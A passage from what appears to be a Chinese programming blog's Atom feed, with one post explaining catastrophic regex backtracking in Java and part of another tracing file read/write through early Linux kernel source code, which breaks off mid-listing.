    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>昨天接触到一个很有意思的问题, 公司测试环境一台机器 CPU 跑到了 400%，导致该机器上的所有服务都挂掉了。</p><p>最后查到的原因竟然是正则表达式所引起的，大大出乎意料啊。虽然早就知道正则效率很差，但绝对没有想到会导致整个机器上服务崩溃的情况。</p><p>先简单展示下问题正则:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String regex = <span class="string">"(\\w+,?)+"</span>;</span><br><span class="line">String val = <span class="string">"abcdefghijklmno,abcdefghijklmno+"</span>;</span><br><span class="line">System.out.println(val.matches(regex));</span><br></pre></td></tr></table></figure><p>最终的执行时间是 17s 左右。</p><p>相反，如果改成 <code>String val = &quot;abcdefghijklmno,abcdefghijklmno&quot;</code> ，实际执行时间 1ms 左右。</p><p>哈哈，完全不是一个量级的结果。</p><p>最后，当然是要找原因了:&lt; 当然，有其它重要的事在耽搁，没时间去看 Java Regex 源码。不过，从正则本身下手反而是个好事情。毕竟几乎所有的编程语言都有对正则的支持。而同样的，都存在着这样的问题。那就可以大胆猜想其实是和语言本身无关，而在于正则规范本身了。</p><p>先给个结果，罪魁祸首就是<code>指数爆炸</code></p><a id="more"></a><h2 id="追本溯源"><a href="#追本溯源" class="headerlink" title="追本溯源"></a>追本溯源</h2><p>这里并不准备一步一步地阐述正则的，如果真的是零基础的话，推荐先看一下 <a href="https://github.com/ziishaned/learn-regex/blob/master/README-cn.md" target="_blank" rel="noopener">学习正则</a></p><p>就事论事，还是以 <code>regex ::= (\w+,?)+</code> 作为示例来进行说明。</p><p>首先需要了解的是 <code>val.matches(regex)</code> 所要进行的工作是判断 <code>val</code> 全串是否符合 <code>regex</code> 正则模式。而正则所要做的工作就是尝试所有的匹配可能性(当然，对于 <code>val</code> 这个串来说，最后匹配到 <code>abcd..,abcd..mno+</code> 的 <code>+</code> 的时候一定是失败的，因为 <code>regex</code> 并不匹配 <code>+</code>)</p><p>简单扩展一下对<code>尝试所有匹配可能性</code>这句话的描述:</p><p>我们以 <code>()</code> 对应 <code>regex</code> 中的一组 <code>(\w+,?)</code> ，而最后一个 <code>+</code> 表示一个或多个(即允许存在多个<code>()</code>)</p><p>对 <code>val</code> 串的匹配可能性有</p><ul><li><p>(abcdefghijklmno,)(abcdefghijklmno)+</p></li><li><p>(abcd)(efghijklmno,)(abcdefghijklmno)+</p></li><li><p>(abcdefghijklmno,)(abcdef)(ghijklmno)+</p></li><li><p>(abc)(defghijklmno,)(abcde)(fg)(hijklmno)+</p></li><li><p>…</p></li></ul><p>有相当多的匹配可能，不再一一详述(事实上，光靠个人手工根本列举不完。</p><p>那么到底会有多少中匹配可能性呢?</p><p>下面我们就来简单计算一下:</p><p>首先，我们把 <code>(\w+,?)+</code> 这个正则扩展一下，它与下列这些串都是等价的 <code>(\w+,|\w+)+</code>, <code>(\w+,)?(\w+)?(\w+,?)+</code>, <code>(\w+,)?(\w+)?(\w+)?(\w+,?)+</code> …</p><p>也就是说，我们能够至少把 <code>abcdefghijklmno,abcdefghijklmno+</code> 按照匹配串划分出1组，2组，3组…30组(因为每个组至少需要一个<code>\w</code> )</p><p>不过这个按照1组，2组…去计算可能性的话实在是费力不讨好的事情。用组合数学来考虑这个问题</p><p>首先，整个 <code>abcdefghijklmno,abcdefghijklmno+</code> 的开始应该有一个左括号 <code>(</code>，即 <code>(abcdefghijklmno,abcdefghijklmno+</code></p><p>其次，到 <code>,</code> 为止至少应该有一个右左括号 <code>)(</code>，即 <code>(abcdefghijklmno,)(abcdefghijklmno+</code></p><p>再次，由于到 <code>o+</code> 为止一定匹配失败，因此，<code>+</code> 之前应该有一个 <code>)</code>, 即 <code>(abcdefghijklmno,)(abcdefghijklmno)+</code></p><p>至于其他字符间的空隙，除了 <code>o,</code> 之间不能存在右左括号 <code>)(</code> ，其他字符间都可以随意插入 <code>)(</code> (至于为什么是右左括号，表示前一个组的结束与新的组的开始)</p><p>那么总共有多少种可能? </p><ul><li><p>插入零个右左括号 <code>)(</code> , $C_{28}^0$ = 1 种可行方案</p></li><li><p>插入一个右左括号 <code>)(</code> , $C_{28}^1$ = 28 种可行方案 (总共 28 个可用字符间隙)</p></li><li><p>插入两个右左括号 <code>)(</code> , $C_{28}^2$ 种可行方案</p></li><li><p>…</p></li><li><p>插入28个右左括号 <code>)(</code> , $C_{28}^{28}$ 种可行方案</p></li></ul><p>累加的结果为 $C_{28}^1 + C_{28}^2 + C_{28}^3 + … + C_{28}^{28} = 2^{28}$</p><p>可想而知为什么会花 17s 了吧。毕竟达到了 2500 万以上的计算量级，加上 regex 本身就是偏慢的。</p><p>至于为什么把 <code>abcdefghijklmno,abcdefghijklmno+</code> 串的 <code>+</code> 去掉就变快了？理由也很简单，<code>matches(regex)</code> 在正则串与原串匹配上之后就会快速结束，因为结果只需要告知某次匹配成功了即可。而失败的匹配会不断地尝试所有的可能性。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>至于解决方案，从上面的原因就可以看到，拒绝在贪婪组模式下(<code>(...)+</code>) 的组内多模式匹配可能。即 <code>(a+a+)+</code> 是不能被允许的，而 <code>(a+b+)+</code> 是可靠的。</p><p>写得仓促，如有根源性错误，欢迎指正。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.regular-expressions.info/catastrophic.html" target="_blank" rel="noopener">Catastrophic Backtracking(灾难性回溯)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;昨天接触到一个很有意思的问题, 公司测试环境一台机器 CPU 跑到了 400%，导致该机器上的所有服务都挂掉了。&lt;/p&gt;
&lt;p&gt;最后查到的原因竟然是正则表达式所引起的，大大出乎意料啊。虽然早就知道正则效率很差，但绝对没有想到会导致整个机器上服务崩溃的情况。&lt;/p&gt;
&lt;p&gt;先简单展示下问题正则:&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;String regex = &lt;span class=&quot;string&quot;&gt;&quot;(\\w+,?)+&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;String val = &lt;span class=&quot;string&quot;&gt;&quot;abcdefghijklmno,abcdefghijklmno+&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;System.out.println(val.matches(regex));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最终的执行时间是 17s 左右。&lt;/p&gt;
&lt;p&gt;相反，如果改成 &lt;code&gt;String val = &amp;quot;abcdefghijklmno,abcdefghijklmno&amp;quot;&lt;/code&gt; ，实际执行时间 1ms 左右。&lt;/p&gt;
&lt;p&gt;哈哈，完全不是一个量级的结果。&lt;/p&gt;
&lt;p&gt;最后，当然是要找原因了:&amp;lt; 当然，有其它重要的事在耽搁，没时间去看 Java Regex 源码。不过，从正则本身下手反而是个好事情。毕竟几乎所有的编程语言都有对正则的支持。而同样的，都存在着这样的问题。那就可以大胆猜想其实是和语言本身无关，而在于正则规范本身了。&lt;/p&gt;
&lt;p&gt;先给个结果，罪魁祸首就是&lt;code&gt;指数爆炸&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="regular expression" scheme="https://DorMOUSE-None.github.io/tags/regular-expression/"/>
    
      <category term="指数爆炸" scheme="https://DorMOUSE-None.github.io/tags/%E6%8C%87%E6%95%B0%E7%88%86%E7%82%B8/"/>
    
  </entry>
  
  <entry>
    <title>理解 Linux Kernel (6) - read &amp; write</title>
    <link href="https://DorMOUSE-None.github.io/2018-11-11-understand-Kernel-6/"/>
    <id>https://DorMOUSE-None.github.io/2018-11-11-understand-Kernel-6/</id>
    <published>2018-11-10T16:00:00.000Z</published>
    <updated>2018-11-11T02:42:26.367Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://dormouse-none.github.io/2018-10-14-understand-Kernel-5/">前一篇</a>已经描述对文件系统进行了宏观性的描述，这一篇，将以特定的文件读写操作为示例，串联对整个文件系统的基本操作。</p><p>首先先来看看平台相关的文件读写操作的 C 代码是怎样一个调用方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">panic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s (errno=%d)\n"</span>, strerror(errno), errno);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 打开文件 frw.txt (以可读写 | 若不存在则新建的形式) */</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/root/frw.txt"</span>, O_RDWR | O_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> panic();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 向文件写入 Hello World! 共计 12 个字符 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> wsize = write(fd, <span class="string">"Hello World!"</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (wsize == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> panic();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 重定位文件读写指针 */</span></span><br><span class="line">    <span class="keyword">off_t</span> off = lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    <span class="keyword">if</span> (off == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> panic();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* buf = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(wsize);</span><br><span class="line">    <span class="comment">/* 读取文件内容 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> rsize = read(fd, buf, wsize);</span><br><span class="line">    <span class="keyword">if</span> (rsize == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> panic();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="comment">/* 关闭文件 */</span></span><br><span class="line">    <span class="keyword">int</span> stat = close(fd);</span><br><span class="line">    <span class="keyword">if</span> (stat == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> panic();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="高速缓冲区初始化"><a href="#高速缓冲区初始化" class="headerlink" title="高速缓冲区初始化"></a>高速缓冲区初始化</h2><p>上一篇已经描述过了，文件系统的结构、包括数据，都是持久化地存储在存储设备中的。</p><p>但是，我们应该也隐约的了解另一个事实，文件读写操作并不会直接操作存储设备上的数据，而是先经过一个称之为高速缓冲的内存区域。</p><p>那么，高速缓冲是什么? 究竟承担什么工作? 先来看看它的初始化流程吧。</p><p>首先回到 <code>main.c</code> (内核代码的主函数)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> ROOT_DEV = ORIG_ROOT_DEV;</span><br><span class="line"> drive_info = DRIVE_INFO;</span><br><span class="line">memory_end = (<span class="number">1</span>&lt;&lt;<span class="number">20</span>) + (EXT_MEM_K&lt;&lt;<span class="number">10</span>);</span><br><span class="line">memory_end &amp;= <span class="number">0xfffff000</span>;</span><br><span class="line"><span class="keyword">if</span> (memory_end &gt; <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">memory_end = <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">if</span> (memory_end &gt; <span class="number">12</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">buffer_memory_end = <span class="number">4</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (memory_end &gt; <span class="number">6</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">buffer_memory_end = <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buffer_memory_end = <span class="number">1</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">main_memory_start = buffer_memory_end;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RAMDISK</span></span><br><span class="line">main_memory_start += rd_init(main_memory_start, RAMDISK*<span class="number">1024</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">mem_init(main_memory_start,memory_end);</span><br><span class="line">trap_init();</span><br><span class="line">blk_dev_init();</span><br><span class="line">chr_dev_init();</span><br><span class="line">tty_init();</span><br><span class="line">time_init();</span><br><span class="line">sched_init();                       <span class="comment">// 第四篇已经讲过，负责任务调度模块的初始化</span></span><br><span class="line">buffer_init(buffer_memory_end);     <span class="comment">// 本篇的起始，负责缓冲区的初始化</span></span><br><span class="line">hd_init();</span><br><span class="line">floppy_init();</span><br><span class="line">sti();</span><br><span class="line">move_to_user_mode();</span><br><span class="line"><span class="keyword">if</span> (!fork()) &#123;<span class="comment">/* we count on this going ok */</span></span><br><span class="line">init();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(;;) pause();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>buffer_init(buffer_memory_end);</code> 用来初始化缓冲区。此处有几个原因:</p><ol><li><p>CPU 读写操作如果直接操作外存，速度上是一个极大的考验。毕竟内存已经较之 CPU 速度慢，外存的读写速度就更慢了。</p></li><li><p>解耦，其实读写操作并不仅仅发生在外存(块存储设备)，同样的，字符设备等等也都会需要读写操作，增加中间层可以封装变化。</p></li><li><p>更多，个人了解有限…</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> &#123;</span></span><br><span class="line"> <span class="keyword">char</span> * b_data;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> b_blocknr;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> b_dev;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> b_uptodate;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> b_dirt;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> b_count;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> b_lock;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">b_wait</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">b_prev</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">b_next</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">b_prev_free</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">b_next_free</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* from fs/buffer.c */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buffer_init</span><span class="params">(<span class="keyword">long</span> buffer_end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">h</span> = <span class="title">start_buffer</span>;</span></span><br><span class="line"><span class="keyword">void</span> * b;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (buffer_end == <span class="number">1</span>&lt;&lt;<span class="number">20</span>)</span><br><span class="line">b = (<span class="keyword">void</span> *) (<span class="number">640</span>*<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">b = (<span class="keyword">void</span> *) buffer_end;</span><br><span class="line"><span class="keyword">while</span> ( (b -= BLOCK_SIZE) &gt;= ((<span class="keyword">void</span> *) (h+<span class="number">1</span>)) ) &#123;</span><br><span class="line">h-&gt;b_dev = <span class="number">0</span>;</span><br><span class="line">h-&gt;b_dirt = <span class="number">0</span>;</span><br><span class="line">h-&gt;b_count = <span class="number">0</span>;</span><br><span class="line">h-&gt;b_lock = <span class="number">0</span>;</span><br><span class="line">h-&gt;b_uptodate = <span class="number">0</span>;</span><br><span class="line">h-&gt;b_wait = <span class="literal">NULL</span>;</span><br><span class="line">h-&gt;b_next = <span class="literal">NULL</span>;</span><br><span class="line">h-&gt;b_prev = <span class="literal">NULL</span>;</span><br><span class="line">h-&gt;b_data = (<span class="keyword">char</span> *) b;</span><br><span class="line">h-&gt;b_prev_free = h<span class="number">-1</span>;</span><br><span class="line">h-&gt;b_next_free = h+<span class="number">1</span>;</span><br><span class="line">h++;</span><br><span class="line">NR_BUFFERS++;</span><br><span class="line">        <span class="comment">/* 跳过 640K ~ 1M 的显存和 BIOS RAM 部分 */</span></span><br><span class="line"><span class="keyword">if</span> (b == (<span class="keyword">void</span> *) <span class="number">0x100000</span>)</span><br><span class="line">b = (<span class="keyword">void</span> *) <span class="number">0xA0000</span>;</span><br><span class="line">&#125;</span><br><span class="line">h--;</span><br><span class="line">free_list = start_buffer;</span><br><span class="line">free_list-&gt;b_prev_free = h;</span><br><span class="line">h-&gt;b_next_free = free_list;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;NR_HASH;i++)</span><br><span class="line">hash_table[i]=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>缓冲块的所有关键信息都由 <code>buffer_head</code> 数据结构进行记录, 至于有多少个 <code>buffer_head</code>? 只能说能划分多少就划分多少。</p><p>比较直观的结构信息如下</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fwy2iag1exj31kw0k1dgb.jpg" alt=""></p><p>在 <code>main.c</code> 中已经提前确认了内核程序占用内存的大小，缓冲区大小以及主内存大小。</p><p>在高速缓冲区的开始位置，都用来存储 <code>buffer_head</code> 的信息，与每个缓冲块(从缓冲区结束位置开始分配)一一对应，直到中间某个位置不足以分配缓冲块为止。</p><p>另外的信息，就是可以看到一个 <code>hash_table</code> 数据结构了。</p><p>应该都能够想象，每个缓存块与外存中的数据块相对应，通过设备号 + 数据块号进行唯一定位。但是，如何快速查找需要操作的数据块是否已经存在与高速缓存中了呢? 显然直接遍历查找是不太可靠的办法。采用开放地址法的哈希表能够协助快速定位缓冲块。</p><h2 id="挂载文件系统"><a href="#挂载文件系统" class="headerlink" title="挂载文件系统"></a>挂载文件系统</h2><p>既然高速缓冲区都准备就绪了，那么文件系统是否已经挂载了呢? 很遗憾，知道 <code>main()</code> 调用 <code>init()</code> 函数之前，文件系统依然没有挂载，也就是说，CPU 仍然只能通过基本输入输出对存储设备进行相当初级的 IO 操作。</p><p>那么，什么时候才能去挂载根目录呢?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* from init/main.c */</span></span><br><span class="line"><span class="comment">/* 由 main() 触发 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pid,i;</span><br><span class="line">    <span class="comment">/* 这是比较重要的一环了，开始挂载的起始动作 */</span></span><br><span class="line">setup((<span class="keyword">void</span> *) &amp;drive_info);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>setup</code> 函数做了什么呢？这是一个内嵌汇编，主要做的就是触发系统调用 <code>int 0x80</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__inline__ int setup(void * BIOS) &#123; </span><br><span class="line">    long __res; </span><br><span class="line">    __asm__ volatile (</span><br><span class="line">            &quot;int $0x80&quot; </span><br><span class="line">            : &quot;=a&quot; (__res) </span><br><span class="line">            : &quot;0&quot; (0),&quot;b&quot; ((long)(BIOS))</span><br><span class="line">    ); </span><br><span class="line">    if (__res &gt;= 0) </span><br><span class="line">        return (int) __res; </span><br><span class="line">    errno = -__res; </span><br><span class="line">    return -1; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中看到给出的 <code>EAX = 0</code>, 查表(表在 <code>include/linux/sys.h</code> 里) 可以知道触发的是 <code>sys_setup</code> 函数(函数位于 <code>kernel/blk_drv/hd.c</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This may be used only once, enforced by 'static int callable' */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_setup</span><span class="params">(<span class="keyword">void</span> * BIOS)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> callable = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> i,drive;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> cmos_disks;</span><br><span class="line"><span 